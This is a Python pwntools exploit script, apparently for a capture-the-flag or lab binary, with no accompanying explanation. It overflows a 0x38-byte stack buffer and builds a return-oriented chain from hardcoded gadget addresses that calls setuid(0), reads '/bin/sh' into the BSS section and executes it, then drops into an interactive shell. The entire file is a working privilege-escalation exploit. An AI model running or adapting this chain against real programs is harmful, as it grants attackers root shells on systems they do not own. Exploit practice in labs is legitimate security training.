#!/bin/python

from pwn import * 
import sys

GOAL = b'/bin/sh\x00'
BUFFER_LEN=0x38

# addr of pop REG;
RAX = p64(0x402242)
RDI = p64(0x402252)
RSI = p64(0x40223a) 
RDX = p64(0x40225b)
SYSCALL = p64(0x402262)

BSS = p64(
         0x4050b0   
        #0x405090  
    )


def setuid():
    return b"".join([
        RAX,
        p64(0x69),
        RDI,
        p64(0),   
        SYSCALL,
    ])


def read_binsh():
    return b"".join([
        RAX,
        p64(0),
        RDI,
        p64(0),
        RSI,
        BSS,
        RDX,
        p64(len(GOAL)+1),
        SYSCALL
    ])


def execv_bss():
    return b"".join([
        RAX,
        p64(0x3b),
        RDI,
        BSS,
        RSI,
        p64(0),
        RDX,
        p64(0),
        SYSCALL
    ])


def get_payload(args, proc: process):
    payload = cyclic(BUFFER_LEN)

    payload += setuid()
    payload += read_binsh()
    payload += execv_bss()

    return payload


def main():
    proc = process(sys.argv[1])
    proc.send(get_payload(None, proc))
    proc.sendline(GOAL)

    proc.interactive()


if __name__ == '__main__':
    main()
